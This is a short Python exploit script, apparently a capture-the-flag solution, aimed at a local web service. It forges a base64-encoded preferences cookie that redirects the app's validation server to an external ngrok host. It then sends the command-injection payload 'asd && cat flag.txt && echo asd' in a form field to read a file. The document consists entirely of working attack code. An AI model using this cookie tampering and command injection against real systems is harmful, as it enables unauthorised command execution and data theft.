import requests
import base64
import json
url = "http://127.0.0.1:1337"
sess = requests.Session()

pref = {
  "validation_server": "https://5cadb88de978.ngrok-free.app"
}
sess.get(url + "/release?debug=true", cookies={"preferences":base64.b64encode(json.dumps(pref).encode()).decode()})

res = sess.post(url + "/feature", data={"text": "asd && cat flag.txt && echo asd"})
print(res.text)